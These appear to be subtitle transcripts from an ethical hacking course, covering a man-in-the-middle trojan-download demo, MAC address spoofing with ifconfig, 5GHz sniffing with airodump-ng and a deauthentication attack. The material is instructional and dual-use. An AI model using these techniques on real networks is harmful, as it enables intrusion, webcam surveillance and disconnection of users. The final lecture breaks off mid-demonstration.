# Section 1: Introduction

1
00:00:00,480 --> 00:00:06,990
Now, before we dive into the course content, I'd like to give you a teaser or a taste of what you'll

2
00:00:06,990 --> 00:00:09,420
be able to do by the end of the course.

3
00:00:09,870 --> 00:00:16,860
So this is going to be one example that's based on one topic that's covered in one subsection of the

4
00:00:16,860 --> 00:00:17,580
course.

5
00:00:17,700 --> 00:00:21,020
So by the end of the course you'll be able to do so much more.

6
00:00:21,030 --> 00:00:27,240
But I chose to make a teaser on this topic because first of all, it's the last topic explained in the

7
00:00:27,240 --> 00:00:27,690
course.

8
00:00:27,690 --> 00:00:31,290
So you're going to have to go through the whole course to know how to do this.

9
00:00:31,620 --> 00:00:36,570
Also, I think this topic can be used to make a really nice teaser.

10
00:00:37,410 --> 00:00:39,660
Now because this is a teaser lecture.

11
00:00:39,660 --> 00:00:45,060
I'm not going to explain the technical aspect of how am I doing this because I'm going to teach you

12
00:00:45,060 --> 00:00:47,550
how to do this as you go through the course.

13
00:00:47,580 --> 00:00:50,820
For now, just sit back and enjoy this lecture.

14
00:00:50,820 --> 00:00:56,010
And after this lecture, we're going to dive into the course content where you learn how to do things

15
00:00:56,010 --> 00:00:58,120
like this and much, much more.

16
00:00:58,140 --> 00:01:05,070
So we're going to try to hack into this Windows machine from this Kali machine.

17
00:01:05,580 --> 00:01:11,250
Now, this Windows machine is connected to the same network as this Kali machine.

18
00:01:11,250 --> 00:01:17,310
So this attack will work whether the windows and the Kali machines are connected to the same Wi-Fi network

19
00:01:17,310 --> 00:01:21,630
or if they're connected to the same Ethernet or wired network.

20
00:01:22,620 --> 00:01:26,100
Now, as you can see, the machine is full of weird text.

21
00:01:26,130 --> 00:01:32,340
That's because I've already executed all of the attack, so I'm listening for incoming connections here.

22
00:01:32,340 --> 00:01:39,720
I'm ARP spoofing the Windows machine here and I'm running the script that's doing all the magic in here.

23
00:01:40,170 --> 00:01:48,120
Basically, the script that's running in this terminal tab in here can be used to convert any file that

24
00:01:48,120 --> 00:01:52,650
any person downloads to a Trojan made out of that file.

25
00:01:52,650 --> 00:01:57,120
As long as the person is connected to the same network as us.

26
00:01:57,630 --> 00:02:01,590
Now, this script is not something that we're just going to download and install.

27
00:02:01,590 --> 00:02:06,690
You're going to learn how to actually think and write scripts like this one.

28
00:02:06,690 --> 00:02:11,820
So throughout the course we're going to implement this script ourselves using Python and Man in the

29
00:02:11,820 --> 00:02:12,810
Middle Proxy.

30
00:02:14,040 --> 00:02:18,090
So this script is already running and let's go and see it in action.

31
00:02:18,390 --> 00:02:24,270
So let's say the target person wants to download Firefox, so we're just going to go to firefox.com.

32
00:02:26,720 --> 00:02:28,340
We get Firefox website.

33
00:02:28,370 --> 00:02:32,150
Now keep in mind Firefox websites use Https.

34
00:02:32,150 --> 00:02:36,050
So it's supposed to be secure against attacks like this one.

35
00:02:36,290 --> 00:02:41,630
Now the user is just going to go and download Firefox from the button that the website offers.

36
00:02:43,490 --> 00:02:48,140
And then the Firefox installer is going to get downloaded, as you can see here.

37
00:02:49,300 --> 00:02:52,350
Then I'm just going to go to my downloads to show you.

38
00:02:52,360 --> 00:02:55,930
As you can see, we have a file with an installer icon.

39
00:02:55,930 --> 00:03:00,100
It's called Firefox Installer if we double click this.

40
00:03:00,690 --> 00:03:03,660
It's an E, so it's asking me if I want to run the CNC.

41
00:03:03,720 --> 00:03:04,500
I'm going to say yes.

42
00:03:04,500 --> 00:03:06,240
I want to install Firefox.

43
00:03:06,630 --> 00:03:11,910
And as you can see, we have the publisher Firefox, which is all good.

44
00:03:11,940 --> 00:03:16,800
We're going to say, yes, please install this for me and then we're going to get the Firefox installer.

45
00:03:16,800 --> 00:03:18,930
So everything looks perfect.

46
00:03:18,960 --> 00:03:20,730
Nothing suspicious at all.

47
00:03:21,790 --> 00:03:27,100
If we go to the Kali machine, you'll see that we actually gained access to this computer.

48
00:03:27,100 --> 00:03:32,590
And now I actually have full control over this computer and I can do whatever I want with it.

49
00:03:32,590 --> 00:03:40,210
So I can download, upload files, edit files, install programs, install viruses, lock the keys or

50
00:03:40,210 --> 00:03:41,260
do anything I want.

51
00:03:41,290 --> 00:03:46,360
I can even access the computer resources such as the mic or the webcam.

52
00:03:46,840 --> 00:03:53,410
So as you know, I like to run the webcam in my teaser lectures just to convey the idea that I have

53
00:03:53,410 --> 00:03:55,390
full control over the computer.

54
00:03:55,630 --> 00:03:58,270
So I'm just going to do webcam stream.

55
00:03:58,860 --> 00:04:01,650
To open the webcam of the hacked computer.

56
00:04:02,300 --> 00:04:06,860
And as you can see, you'll see me through the webcam of the Windows computer.

57
00:04:06,890 --> 00:04:11,690
Now, I'm going to close this, and this is not all that I want to show you.

58
00:04:12,250 --> 00:04:18,520
Now, this script will also work with other file types because you're going to understand how this works

59
00:04:18,520 --> 00:04:20,290
and how to implement it yourself.

60
00:04:20,320 --> 00:04:24,550
You're going to be able to adapt it, to get it to work with any file type.

61
00:04:24,760 --> 00:04:26,980
So let me close this.

62
00:04:26,980 --> 00:04:30,100
So I'm going to do control C exploit.

63
00:04:30,770 --> 00:04:33,730
Or sorry exit first to close this connection.

64
00:04:33,740 --> 00:04:37,040
So right now, I closed my connection with the hacked machine.

65
00:04:37,040 --> 00:04:41,270
I don't have control over it anymore, and I'm going to do exploit again.

66
00:04:42,020 --> 00:04:44,540
And now I'm going to go to the Windows machine.

67
00:04:45,270 --> 00:04:50,150
And I'm going to close this and I'm going to try to download a PDF.

68
00:04:50,160 --> 00:04:53,420
I'm just going to try to open a normal PDF file.

69
00:04:53,430 --> 00:04:58,920
So let's say the target wants to learn about network security, so they're going to look for network

70
00:04:58,920 --> 00:05:00,510
security PDF.

71
00:05:01,610 --> 00:05:03,980
And let's go to the first result in here.

72
00:05:03,980 --> 00:05:05,570
I'm going to click on that.

73
00:05:07,400 --> 00:05:11,120
Now, as you can see, this got downloaded as a zip file.

74
00:05:11,570 --> 00:05:16,250
So if I go to my downloads, you'll see I have a zip file called Security.

75
00:05:16,970 --> 00:05:19,250
I'm going to extract this here.

76
00:05:20,650 --> 00:05:26,020
And as you can see, I have a PDF book called Security has a PDF Icon.

77
00:05:26,050 --> 00:05:27,910
If we double click this.

78
00:05:29,020 --> 00:05:35,560
We will get our book about network security, where we can learn about the different aspects of network

79
00:05:35,560 --> 00:05:36,460
security.

80
00:05:36,700 --> 00:05:43,060
But if we go to the Kali machine again, you can see that we have full control over the machine.

81
00:05:43,060 --> 00:05:44,950
We got a meterpreter connection.

82
00:05:44,950 --> 00:05:50,440
And again, just as an example, I'm going to run the web stream to show you that I got full control

83
00:05:50,440 --> 00:05:52,300
and I can access the web cam.

84
00:05:52,300 --> 00:05:53,470
And here we go.

85
00:05:53,500 --> 00:05:57,130
I'm accessing the web cam through the hacked windows machine.

86
00:05:58,060 --> 00:06:02,350
Now, as I said, this is just a taste of what you'll be able to do.

87
00:06:02,350 --> 00:06:05,490
This is not everything that's going to be covered in the course.

88
00:06:05,500 --> 00:06:11,860
This is only covered in one subsection of the course, and you're going to understand exactly how to

89
00:06:11,860 --> 00:06:16,180
do this and how to write the tool that's used to run this attack.

90
00:06:16,180 --> 00:06:21,400
So you're going to be able to use the same knowledge to implement other man in the middle tools that

91
00:06:21,400 --> 00:06:23,710
will run your own attack ideas.

92
00:06:24,690 --> 00:06:28,190
Throughout the course, you're going to learn a lot more than just this.

93
00:06:28,200 --> 00:06:31,920
And with everything that you're going to learn, you're going to learn it in details.

94
00:06:31,920 --> 00:06:37,350
And we're going to break it down into small components so that you understand how they work and you

95
00:06:37,350 --> 00:06:41,310
can combine them together to run your own attack ideas.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,740 --> 00:00:01,970
Hello and welcome.

2
00:00:02,420 --> 00:00:03,580
My name is Zaid.

3
00:00:03,590 --> 00:00:08,660
I'm an ethical hacker, a computer scientist, and I'll be your instructor in this course.

4
00:00:10,100 --> 00:00:16,220
As mentioned in the course requirements, you need to finish the network hacking section of my general

5
00:00:16,220 --> 00:00:22,190
ethical hacking course or finish my network hacking course before starting this course.

6
00:00:22,220 --> 00:00:27,170
This is because this course builds up on what you learn in these courses.

7
00:00:27,380 --> 00:00:34,100
So the main sections in this course have similar titles to the titles used in the other courses.

8
00:00:34,100 --> 00:00:40,220
That's because, like I said, it builds up on what you learn in these courses, but the content in

9
00:00:40,220 --> 00:00:42,170
here is more advanced.

10
00:00:42,710 --> 00:00:48,440
So in the first section, the pre connection section, we're going to be revisiting the pre connection

11
00:00:48,440 --> 00:00:53,990
attacks and we're going to build up on what you learn to run more advanced attacks.

12
00:00:53,990 --> 00:00:58,910
So you're going to learn how to change your Mac address manually so you can change it on any device

13
00:00:58,910 --> 00:01:02,390
that supports that without relying on any tools.

14
00:01:02,690 --> 00:01:08,210
You're going to learn how to extend the pre connection attacks that you know so far and run them against

15
00:01:08,210 --> 00:01:11,330
five gigahertz clients and five gigahertz networks.

16
00:01:11,330 --> 00:01:18,020
And you'll also going to learn how to extend the authentication attack and target multiple computers

17
00:01:18,020 --> 00:01:20,660
and multiple networks at the same time.

18
00:01:20,960 --> 00:01:25,010
Once done with that, we're going to move to the gaining access section.

19
00:01:25,400 --> 00:01:32,000
In this section, we're going to talk about how to gain access to various types of networks and various

20
00:01:32,000 --> 00:01:33,500
types of encryptions.

21
00:01:33,950 --> 00:01:39,980
Now, by now, you know, some basic methods to gain access to WEP, WPA and Wpa2.

22
00:01:40,370 --> 00:01:46,200
But in this course, before we talk about the advanced methods to do that, I'm going to show you how

23
00:01:46,200 --> 00:01:52,860
to bypass some security implementations that will prevent you from even trying anything against these

24
00:01:52,860 --> 00:01:53,720
networks.

25
00:01:53,730 --> 00:01:59,190
So you're going to learn how to discover the names of hidden networks, how to run the attacks against

26
00:01:59,190 --> 00:02:05,820
them, and how to bypass Mac filtering, whether it's implemented, using a blacklist or using a whitelist.

27
00:02:07,230 --> 00:02:12,780
Once done with that, we're going to move to cracking WEP, WPA and Wpa2.

28
00:02:12,780 --> 00:02:19,080
But in each of these sections, we're going to be covering new, more advanced attacks that will either

29
00:02:19,080 --> 00:02:26,130
allow you to get the password quicker or they'll allow you to bypass some security features implemented

30
00:02:26,130 --> 00:02:32,850
by the router, or they'll enhance your attack and allow you to target even more secure networks in

31
00:02:32,850 --> 00:02:33,480
this course.

32
00:02:33,480 --> 00:02:40,050
We'll also going to cover WPA and Wpa2 Enterprise, which we never spoke about before.

33
00:02:40,080 --> 00:02:46,440
These are similar to secure networks implemented in colleges and companies where there is an encryption

34
00:02:46,440 --> 00:02:46,920
used.

35
00:02:46,920 --> 00:02:52,260
And even when people connect to the network, they have to put a username and a password.

36
00:02:52,940 --> 00:02:56,270
Not only that, but we'll also cover captive portals.

37
00:02:56,270 --> 00:03:03,740
So these are similar to networks used in hotels and in airports where where there is no encryption used.

38
00:03:03,740 --> 00:03:07,700
But once you connect, you have to put a username and password in this section.

39
00:03:07,700 --> 00:03:11,990
I'm also going to show you how to manually create fake access points.

40
00:03:11,990 --> 00:03:17,930
We're going to break that down into its smaller components and then combine it all together to create

41
00:03:17,930 --> 00:03:22,370
a fake access point that looks like any other normal Wi-Fi network.

42
00:03:22,460 --> 00:03:26,570
So you're going to understand exactly how fake access points work.

43
00:03:26,570 --> 00:03:32,300
And then I'm going to show you how to use it to gain access to WPA and Wpa2 networks without running

44
00:03:32,300 --> 00:03:34,910
any guessing and without doing a brute force attack.

45
00:03:34,920 --> 00:03:40,040
You'll also learn how to use that to gain access to captive portals, and you'll learn how to use it

46
00:03:40,040 --> 00:03:40,350
too.

47
00:03:40,370 --> 00:03:42,800
With any other scenario that you think of.

48
00:03:42,800 --> 00:03:46,940
Once done with this, we're going to move to the Post Connection attack section.

49
00:03:47,330 --> 00:03:52,980
In this section, you're going to learn a number of attacks that you can do after connecting to the

50
00:03:52,980 --> 00:03:53,640
network.

51
00:03:53,640 --> 00:03:59,610
So all of the attacks that you're going to learn here will work against both Wi-Fi and wired networks.

52
00:03:59,610 --> 00:04:00,150
In here.

53
00:04:00,150 --> 00:04:05,850
You're going to learn how to become the man in the middle using ARP, spoofing how to bypass Https and

54
00:04:05,850 --> 00:04:11,370
sniff sensitive data, how to do DNS spoofing, all of which you already know.

55
00:04:11,370 --> 00:04:16,860
But you're going to learn how to do this manually without relying on scripts like Man in the middle

56
00:04:16,860 --> 00:04:23,040
F So you're going to understand how each of these components work and you'll be able to adapt this to

57
00:04:23,040 --> 00:04:27,870
a number of scenarios, regardless of how you become the man in the middle, whether you became the

58
00:04:27,870 --> 00:04:35,340
man in the middle using an ARP spoofing attack or using a fake access point or using any other method.

59
00:04:36,060 --> 00:04:44,700
Not only that, but I'm also going to show you how to properly analyze the flows that flow in your network.

60
00:04:44,700 --> 00:04:51,750
And I'm going to show you how to start creating your own attacks and write scripts that will automatically

61
00:04:51,750 --> 00:04:55,260
execute your own ideas and your own attacks.

62
00:04:55,620 --> 00:05:01,230
So by the end of this section, if you just have an idea of an attack and there is no tool at all that

63
00:05:01,230 --> 00:05:08,130
does that attack, you're going to know how to first of all analyze how the traffic flows and then think

64
00:05:08,130 --> 00:05:10,140
of how you're going to implement this attack.

65
00:05:10,140 --> 00:05:16,350
And you're also going to have the skills to literally write a script that will execute this attack for

66
00:05:16,350 --> 00:05:16,620
you.

67
00:05:16,620 --> 00:05:22,050
At the end of each of these sections, we're going to talk about the security aspect and how to secure

68
00:05:22,050 --> 00:05:24,900
yourself and your systems from these attacks.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 2: Back To BasicsPre-Connection Attacks

1
00:00:00,990 --> 00:00:06,480
Unlike my other courses in this section, I'm not going to teach you how to set up your lab, install

2
00:00:06,480 --> 00:00:12,660
Kali, Linux and all of that because I show how to do that in my general ethical hacking course and

3
00:00:12,660 --> 00:00:14,370
in my network hacking course.

4
00:00:14,370 --> 00:00:19,830
And as mentioned in the course requirements, you need to finish the network hacking section of the

5
00:00:19,830 --> 00:00:25,920
general ethical Hacking course or finish my network hacking course before enrolling in this course.

6
00:00:26,710 --> 00:00:30,370
So in this course, we're going to dive into hacking straight away.

7
00:00:30,490 --> 00:00:33,730
In this section, it's going to be the basic section.

8
00:00:33,730 --> 00:00:38,710
So we're going to be visit some basics that you already know, and I'm going to show you how to extend

9
00:00:38,710 --> 00:00:41,590
it and build up on the information that, you know.

10
00:00:41,590 --> 00:00:46,690
For example, I'm going to show you how to change your Mac address manually so you'll be able to change

11
00:00:46,690 --> 00:00:51,850
the Mac on any device that supports that without the need to use any tools.

12
00:00:52,150 --> 00:00:58,450
I'll also show you how to extend all the pre connection attacks so that you can target networks and

13
00:00:58,450 --> 00:01:01,390
clients that use five gigahertz frequency.

14
00:01:01,420 --> 00:01:07,630
Finally, we're going to extend the authentication attack so you'll be able to run it against multiple

15
00:01:07,630 --> 00:01:10,640
devices and multiple networks at the same time.

16
00:01:10,660 --> 00:01:16,690
Not only that, but you'll also be able to target all devices and all networks around you and manage

17
00:01:16,690 --> 00:01:18,700
all these connections and control them.

18
00:01:20,030 --> 00:01:24,350
So throughout the course I'm going to be using Kali Linux as the hacker machine.

19
00:01:24,350 --> 00:01:28,430
It's going to be installed as a virtual machine, but you can install it as a main machine.

20
00:01:28,430 --> 00:01:29,690
It doesn't really matter.

21
00:01:29,690 --> 00:01:34,820
And whenever I run a wireless attack, I'm going to be using a wireless adapter connected to the Kali

22
00:01:34,820 --> 00:01:35,510
machine.

23
00:01:36,260 --> 00:01:41,480
Now, I covered installing Kali as a virtual machine and connecting a wireless adapter in my general

24
00:01:41,480 --> 00:01:44,450
ethical hacking course and in my network hacking course.

25
00:01:44,450 --> 00:01:49,450
So it doesn't matter which course you take in by now you should already know how to do that.

26
00:01:49,460 --> 00:01:54,530
So if you don't remember how to do it, please go back and revise it and come back to this lecture.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,570 --> 00:00:05,880
In the previous lecture we learned what the Mac address is, what it's used for, and how to change

2
00:00:05,880 --> 00:00:07,800
it, to bypass blacklists.

3
00:00:07,830 --> 00:00:12,090
Whitelists and how to hide your identity by changing your Mac address.

4
00:00:12,120 --> 00:00:15,360
We've seen how to do that using a tool called Mac Changer.

5
00:00:15,360 --> 00:00:21,030
And in this video I want to show you another way to change your Mac address in case you are on a system

6
00:00:21,030 --> 00:00:25,770
that didn't have Mac Changer installed on it, or if Mac Changer didn't work for you.

7
00:00:25,920 --> 00:00:30,690
So the method that we're going to talk about now doesn't need any programs to be installed on the system.

8
00:00:30,690 --> 00:00:33,570
You can use it with the native ifconfig command.

9
00:00:33,600 --> 00:00:37,590
So first of all, I'm going to list my interfaces, so I'm going to do ifconfig.

10
00:00:39,770 --> 00:00:45,350
And here is my wireless interface line zero, which I want to change the Mac address and this is its

11
00:00:45,350 --> 00:00:46,580
current Mac address.

12
00:00:46,700 --> 00:00:49,850
So the first step is going to be put in this interface down.

13
00:00:49,850 --> 00:00:52,280
So disabling it like we did in the previous video.

14
00:00:52,280 --> 00:00:55,220
So I'm just going to do ifconfig lan zero down.

15
00:00:56,970 --> 00:01:00,750
Now the interface is disabled and I can play with its properties.

16
00:01:00,750 --> 00:01:04,440
So I'm going to try to change the Mac address by saying ifconfig.

17
00:01:06,780 --> 00:01:07,110
Zero.

18
00:01:07,110 --> 00:01:10,380
So we're giving it the interface that we want to modify its properties.

19
00:01:12,450 --> 00:01:15,060
And we're going to tell it that we want to change the hardware.

20
00:01:17,160 --> 00:01:20,450
And we want to change the value for the other property.

21
00:01:20,460 --> 00:01:24,150
So you can see that the Mac address is shown up here under the header.

22
00:01:24,150 --> 00:01:26,520
So we're going to tell it that we want to change the header.

23
00:01:28,090 --> 00:01:30,070
And we want to set that to the Mac address.

24
00:01:30,070 --> 00:01:33,120
So you can in here, you can put the Mac address that you want to use.

25
00:01:33,130 --> 00:01:39,820
So I'm going to use something simple and I'm going to set it to 001122334455.

26
00:01:41,470 --> 00:01:43,020
So the command is very simple.

27
00:01:43,030 --> 00:01:48,250
We'll do an if config, we're telling it which interface we want to change its properties and we want

28
00:01:48,250 --> 00:01:49,630
to do that to land zero.

29
00:01:49,660 --> 00:01:55,480
Then we told it that we want to change the hardware, we want to change the other, the other property

30
00:01:55,480 --> 00:01:56,280
right here.

31
00:01:56,290 --> 00:02:00,790
So we want to set this other to our new Mac address, which is this one.

32
00:02:00,790 --> 00:02:05,650
And we give it the Mac address, which is 00112233445, five.

33
00:02:05,680 --> 00:02:07,930
You can use any Mac address you want in here.

34
00:02:07,930 --> 00:02:09,430
I'm going to keep it to that.

35
00:02:09,460 --> 00:02:10,570
I'm going to hit enter.

36
00:02:10,870 --> 00:02:15,540
And because we didn't see any error messages, that means the command did execute properly.

37
00:02:15,550 --> 00:02:21,280
So now the last step is to bring the interface up so we can use it and we'll do that using ifconfig

38
00:02:21,280 --> 00:02:22,690
lan zero up.

39
00:02:23,950 --> 00:02:26,740
So it's the exact opposite of what we did at the start.

40
00:02:26,740 --> 00:02:27,200
At the start.

41
00:02:27,220 --> 00:02:31,090
We disabled the interface right now we're going to enable it again.

42
00:02:31,240 --> 00:02:38,260
I'm going to hit Enter and the interface is ready to use now to make sure that the Mac address did change

43
00:02:38,260 --> 00:02:39,780
to the one that we specified.

44
00:02:39,790 --> 00:02:41,830
I'm going to do ifconfig LAN zero.

45
00:02:42,930 --> 00:02:46,020
To display information about line zero.

46
00:02:46,320 --> 00:02:55,200
And if we look at the either right here, you can see that its Mac address was changed to 001122334455.

47
00:02:55,410 --> 00:02:58,890
Now again, this is exactly the same that what we did in the previous lecture.

48
00:02:58,890 --> 00:03:04,560
But in the previous lecture we did it using mac changer sometimes depending on your wireless card and

49
00:03:04,560 --> 00:03:08,400
depending on your current configuration, Mac changer might not work.

50
00:03:08,400 --> 00:03:12,480
So knowing how to do it manually using the native commands is really handy.

51
00:03:12,480 --> 00:03:17,370
It's also handy if you're on a system on an Android phone or on a different Linux system and you just

52
00:03:17,370 --> 00:03:22,980
don't have Mac Changer installed, you can just do it natively because if config is available on all

53
00:03:22,980 --> 00:03:23,940
Linux systems.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,440 --> 00:00:04,370
In this lecture, I'd like to talk about Wi-Fi bands.

2
00:00:04,520 --> 00:00:10,730
The band of a network defines what frequency it can use to broadcast the signal.

3
00:00:11,120 --> 00:00:17,720
This means it also defines the frequency that the clients or the computers need to be able to support

4
00:00:17,720 --> 00:00:21,350
and use in order to be able to connect to this network.

5
00:00:21,380 --> 00:00:27,560
The two main frequencies used in wi fi networks are 2.4 and five gigahertz.

6
00:00:27,800 --> 00:00:28,490
Now.

7
00:00:28,490 --> 00:00:35,420
Previously when we used Airodump NG, we were only sniffing on the 2.4GHz frequency.

8
00:00:36,420 --> 00:00:39,780
You can see, first of all, my wireless adapter is in monitor mode.

9
00:00:40,020 --> 00:00:40,920
Zero in here.

10
00:00:41,400 --> 00:00:44,310
So if I just do airodump ng one zero.

11
00:00:49,220 --> 00:00:52,700
You'll see that I can get the wireless networks around me.

12
00:00:53,000 --> 00:01:00,320
But you might have noticed that you won't actually see all the networks around you when you run Airodump

13
00:01:00,320 --> 00:01:00,650
ng.

14
00:01:01,820 --> 00:01:03,290
I'm going to control-z this.

15
00:01:03,290 --> 00:01:10,160
And if I go here to my normal host machine and it actually has a built in wireless adapter, so it's

16
00:01:10,160 --> 00:01:17,000
not as strong as my alpha adapter, but if I look for networks, you'll see I actually have much more

17
00:01:17,000 --> 00:01:23,540
networks in here and mainly I have networks and in here in the name by five G.

18
00:01:23,750 --> 00:01:30,230
Now the network doesn't have to necessarily end in five G, but here in Ireland, if a network broadcasts

19
00:01:30,230 --> 00:01:35,090
over five gigahertz, the service provider adds five G to the network name.

20
00:01:35,090 --> 00:01:40,390
But we also have other networks broadcast in over five G that don't end in five G.

21
00:01:40,400 --> 00:01:47,480
But basically the main point that I want to talk about is I'm not able to see all the networks around

22
00:01:47,480 --> 00:01:48,710
me in here and airodump.

23
00:01:48,730 --> 00:01:57,460
NG And the reason for this is because Airodump ng is only sniffing on 2.4GHz frequency.

24
00:01:57,470 --> 00:02:04,230
So if you do this and you don't see all the networks around you, or if you're sniffing on your own

25
00:02:04,230 --> 00:02:10,170
network, but you don't see all the clients in your network, it's possible that your router is broadcasting

26
00:02:10,170 --> 00:02:13,290
over two bands, over 2.4 and five gigahertz.

27
00:02:13,290 --> 00:02:18,180
And if you're not seeing the router at all, if you're not seeing the network at all, like like what's

28
00:02:18,180 --> 00:02:24,180
happening here, for me, then the router is probably just broadcasting over five gigahertz.

29
00:02:24,390 --> 00:02:30,120
Now, this doesn't mean that your wireless adapter is not good, it just literally means that this adapter

30
00:02:30,120 --> 00:02:32,820
is not able to see five gigahertz frequency.

31
00:02:32,820 --> 00:02:36,480
It's just outside of its limit, outside of its reach.

32
00:02:36,780 --> 00:02:42,390
The main problem with five gigahertz is that there are a lot of wireless adapters that can see it and

33
00:02:42,390 --> 00:02:47,880
can communicate with it, but not many of them support monitor mode and packet injection.

34
00:02:47,880 --> 00:02:57,240
So you might see me and other people recommending wireless adapters like Alpha US 036 and hey, this

35
00:02:57,240 --> 00:03:00,000
is my most favorite wireless adapter.

36
00:03:00,000 --> 00:03:05,490
I use it all the time even now, but the problem with that adapter is it doesn't pick up five gigahertz

37
00:03:05,490 --> 00:03:06,360
frequency.

38
00:03:06,360 --> 00:03:09,000
So it doesn't mean that that adapter is bad.

39
00:03:09,000 --> 00:03:12,210
It just means that it can't see five gigahertz frequency.

40
00:03:13,470 --> 00:03:19,770
Like I said, there aren't many wireless adapters that support five gigahertz, but I have an adapter

41
00:03:19,770 --> 00:03:20,310
here.

42
00:03:20,310 --> 00:03:30,510
It's Alpha was 036 ACH and this adapter supports both 2.4GHz and five gigahertz frequencies.

43
00:03:30,540 --> 00:03:34,920
It's not as good as the alpha, but it does the job.

44
00:03:35,250 --> 00:03:39,270
Now, if you want more information about wireless adapters, check out the link in the resources.

45
00:03:39,270 --> 00:03:44,760
I'm not going to talk a lot about what wireless adapters do, but in this lecture I want to show you

46
00:03:44,760 --> 00:03:50,400
how to sniff and discover five gigahertz frequency networks and then so that you can use all the attacks

47
00:03:50,400 --> 00:03:51,300
that you've learned.

48
00:03:51,300 --> 00:03:56,730
In my other lecture and in my previous videos with five gigahertz networks.

49
00:03:57,270 --> 00:04:01,350
So the adapter that I'm using right now supports five gigahertz.

50
00:04:01,350 --> 00:04:05,070
But as you can see, I still can't pick up these networks.

51
00:04:05,070 --> 00:04:12,670
That's because I need to specifically tell Airodump ng that I want you to listen on five gigahertz frequencies

52
00:04:12,670 --> 00:04:14,620
and five gigahertz channels.

53
00:04:15,420 --> 00:04:16,230
To do that.

54
00:04:16,230 --> 00:04:20,010
All we have to do is just do airodump ng like we always do.

55
00:04:21,920 --> 00:04:25,370
And then we're going to use a new argument that we haven't seen before.

56
00:04:25,370 --> 00:04:27,620
And this argument is called band.

57
00:04:29,380 --> 00:04:35,710
And we're going to tell it that I want you to sniff on Band A, and that's the band that supports five

58
00:04:35,710 --> 00:04:37,000
gigahertz frequency.

59
00:04:37,360 --> 00:04:43,450
And then I'm just going to give it my the name of my wireless adapter and monitor mode, which is zero.

60
00:04:45,680 --> 00:04:48,290
So the command is very simple.

61
00:04:48,320 --> 00:04:50,840
It's very similar to what we've used before.

62
00:04:50,840 --> 00:04:55,730
And all we have to do is just type in airodump ng, followed by the band.

63
00:04:55,730 --> 00:05:01,880
And the band that we want to use is a and we're following that with our wireless interface.

64
00:05:03,280 --> 00:05:04,750
So I'm going to hit Enter.

65
00:05:07,380 --> 00:05:11,610
And as you can see, as soon as we hit this, I'm actually just going to do control C now because you

66
00:05:11,610 --> 00:05:12,990
can see the results.

67
00:05:13,170 --> 00:05:19,080
You can see that we got much more networks right now and we have the five gigahertz network.

68
00:05:19,080 --> 00:05:23,400
So we have this network and this network that we weren't able to see.

69
00:05:23,430 --> 00:05:30,180
We have the Jameson Whiskey Network as well, and basically we're able to capture all the networks that

70
00:05:30,180 --> 00:05:32,280
use the five gigahertz frequency.

71
00:05:32,580 --> 00:05:37,770
Now you can use this command exactly the same way that we used it before, so you can add the arguments

72
00:05:37,770 --> 00:05:41,460
that we were using before you can do BS.

73
00:05:42,710 --> 00:05:49,910
ID and put the Mac address of your target and then you can do channel and put the channel you can do

74
00:05:49,910 --> 00:05:50,570
minus.

75
00:05:50,570 --> 00:05:51,710
Minus, right.

76
00:05:51,710 --> 00:05:57,950
And save the data that you store in a file and then run all the attacks that I taught you before in

77
00:05:57,950 --> 00:05:59,180
my other courses.

78
00:05:59,360 --> 00:06:04,220
So I'm not going to go all over that again because the attacks are exactly the same.

79
00:06:04,220 --> 00:06:09,680
The only difference is you want to make sure that you use a wireless adapter that supports five gigahertz

80
00:06:09,680 --> 00:06:16,370
frequency, and if your target uses five gigahertz, then make sure that you tell airodump ng to use

81
00:06:16,370 --> 00:06:21,680
the A band instead of just running on the 2.4GHz frequency.

82
00:06:22,400 --> 00:06:28,700
One more thing that I want to note, I've actually said this before if you run airodump NG against a

83
00:06:28,700 --> 00:06:35,660
network and you see some devices missing, then there is a high chance that these devices are connected

84
00:06:35,660 --> 00:06:36,950
over five gigahertz.

85
00:06:36,950 --> 00:06:42,050
So again, use the band A and then you should be able to see these devices.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,580 --> 00:00:04,750
In this lecture, we're going to talk about an attack called the authentication attack.

2
00:00:04,780 --> 00:00:11,830
This attack basically allows us to disconnect any device from any network, even if that network uses

3
00:00:11,830 --> 00:00:17,680
encryption, even if we don't know the key to that network and even if we're not connected to that network.

4
00:00:17,680 --> 00:00:22,780
So we're still in the pre connection attack section, which means all the attacks that we're talking

5
00:00:22,780 --> 00:00:26,280
about work without the need to connect to the network.

6
00:00:26,290 --> 00:00:31,660
So we're going to be targeting a network that we don't know its password and we're not actually connected

7
00:00:31,660 --> 00:00:38,620
to and we'll be able to disconnect any device from any network as long as the device and the network

8
00:00:38,620 --> 00:00:40,870
are within our Wi-Fi range.

9
00:00:42,030 --> 00:00:48,450
We're going to change our Mac address and pretend to be the target computer and send the request to

10
00:00:48,450 --> 00:00:51,690
the router telling it that I want to disconnect from you.

11
00:00:52,210 --> 00:00:58,630
Then we're going to change our Mac address and pretend to be the router and tell the client, tell our

12
00:00:58,630 --> 00:01:03,700
target computer that I'm the router and I'm going to disconnect you right now because you requested

13
00:01:03,700 --> 00:01:04,870
to be disconnected.

14
00:01:04,900 --> 00:01:10,100
By doing that, we'll be able to disconnect the target computer from the router.

15
00:01:10,120 --> 00:01:15,220
So again, we're going to pretend to be the target computer and tell the router that we want to disconnect.

16
00:01:15,250 --> 00:01:19,750
Then we're going to pretend to be the router and tell the computer I'm going to disconnect you.

17
00:01:19,750 --> 00:01:23,380
And by doing so, we'll be able to disconnect that computer.

18
00:01:23,530 --> 00:01:26,680
All of this is going to be done using a tool called a replay.

19
00:01:26,980 --> 00:01:29,140
So we're actually not going to be doing that manually.

20
00:01:29,140 --> 00:01:31,540
The tool will be doing everything for us.

21
00:01:31,780 --> 00:01:33,310
So let me show you how we do that.

22
00:01:33,310 --> 00:01:35,020
It's very simple and very easy.

23
00:01:35,140 --> 00:01:39,460
First of all, I'm going to run airodump ng against my target network.

24
00:01:41,280 --> 00:01:43,950
And I'm going to be targeting a different network right now.

25
00:01:43,950 --> 00:01:51,330
And that's, again, one of my networks, and it's called UPC, and it ends up with 916.

26
00:01:51,540 --> 00:01:57,930
And in this particular example, I'm going to try to disconnect this Windows machine from the Internet.

27
00:01:58,640 --> 00:02:03,680
So just to show you its Mac address so we know if I do ipconfig all.

28
